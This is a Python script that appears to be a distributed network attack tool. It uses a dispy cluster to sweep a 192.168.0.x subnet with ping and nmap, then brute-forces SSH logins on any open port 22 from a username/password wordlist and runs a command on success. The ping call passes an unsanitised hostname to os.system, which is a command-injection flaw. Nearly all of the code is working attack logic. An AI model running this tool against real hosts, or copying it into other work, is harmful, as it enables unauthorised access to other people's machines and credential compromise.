def compute(hostname):
    import os
    valid = "alive"
    cracked = False
    if (os.system("ping -c 1 -w 1 " + hostname)) == 0:
        print("Host", hostname, "is alive, starting nmap")
        from libnmap.process import NmapProcess
        from libnmap.parser import NmapParser
        nmproc = NmapProcess(hostname, "-sV")
        rc = nmproc.run()
        parsed = NmapParser.parse(nmproc.stdout)
        host = parsed.hosts[0]
        services = []
        status = "Unknown"
        for serv in host.services:
            services.append(str(serv.port) + "/" + str(serv.service))
            print("Open ports:", services)
            if serv.port == 22:
                import paramiko, time
                client = paramiko.client.SSHClient()
                client.load_system_host_keys()
                client.set_missing_host_key_policy(paramiko.WarningPolicy)
                uid_list, pwd_list=[], []
                f = open('/home/pi/prowler/wordlists/wordlist_1.txt','r')
                for row in f:
                    split = row.split(" ")
                    uid_list.append(split[0])
                    pwd_list.append(split[1])
                for i, uid in enumerate(uid_list):
                    pwd = pwd_list[i]
                    try:
                        if cracked == False:
                            time.sleep(0.1)
                            try:
                                client.connect(hostname,username=uid,password=pwd)
                                stdin, stdout, stderr = client.exec_command('ls -l')
                                status = "Poor SSH Credentials"
                                print("Successfully connected to host", hostname)
                                cracked = True
                                credentials = [uid, pwd]
                                client.close()
                            except paramiko.AuthenticationException:
                                client.close()
                                print("failed to pwn, reset")
                            except Exception as e:
                                print("failed to pwn,", e)
                    except Exception as e:
                        print("failed to pwn:", e)
    else:
        valid = "dead"
    print(hostname, valid, cracked)
    return hostname, valid, cracked

if __name__ == '__main__':
    import dispy
    import logging
    import dispy.httpd
    import time

    print("Initialising Cluster")

    workers = ['192.168.0.133','192.168.0.110','169.254.102.163','169.254.116.199','169.254.114.226','169.254.156.34']

    cluster = dispy.JobCluster(
        compute, nodes=workers, ip_addr='192.168.0.142', loglevel=logging.DEBUG)
    http_server = dispy.httpd.DispyHTTPServer(cluster)

    jobs = []
    test_range = []
    for i in range(0, 1):
        for j in range(0, 255):
            test_range.append("192.168." + str(i) + "." + str(j))
    print("Testing " + str(len(test_range)) + " hostnames")

    time.sleep(4) # make sure cluster is connected
    cluster.print_status()

    start = time.time()

    for i, address in enumerate(test_range):
        # schedule execution of 'compute' on a node (running 'dispynode') with a parameter
        job = cluster.submit(address)
        job.id = i  # optionally associate an ID to job (if needed later)
        jobs.append(job)
    # cluster.wait() # waits for all scheduled jobs to finish

    for job in jobs:
        try:
            result = job()
            hostname, valid, breached = result  # waits for job to finish and returns results
            print(job.ip_addr + ": " + hostname + " is " + valid + ".", breached)
            # other fields of 'job' that may be useful:
            # print(job.stdout, job.stderr, job.exception, job.ip_addr, job.start_time, job.end_time)
        except Exception as e:
            print(str(job),"failed with error:",str(e))
            print("debug:", job.stdout, job.stderr, job.exception)

    end = time.time()
    cluster.print_status()
    http_server.shutdown()
    cluster.close()

    print("\n","Total time taken =", str(end - start))
